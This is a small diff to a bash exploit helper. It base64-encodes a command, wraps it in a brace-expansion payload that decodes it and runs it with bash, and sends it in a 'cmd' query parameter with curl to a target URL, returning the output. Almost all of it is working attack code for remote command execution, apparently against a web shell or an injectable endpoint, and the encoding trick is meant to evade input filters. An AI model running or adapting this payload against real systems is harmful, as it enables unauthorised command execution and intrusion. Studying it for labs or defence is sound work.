@@ -14,15 +14,16 @@ encode_command()
   echo $1 | base64 -w 0
 }
 
+# Edit this payload
 build_payload()
 {
-  echo "bash -c \"{echo,$1}|{base64,-d}|{bash,-i}\""
+  echo "/bin/bash -c \"{echo,$1}|{base64,-d}|{bash,-i}\""
 }
 
 # Edit this request
 send_payload()
 {
-  raw=$(curl -s "$url" -G --data-urlencode "cmd=$payload")
+  raw=$(curl -s "$url" -G --data-urlencode "cmd=$1")
   echo "$raw" # Return the command output
 }
 
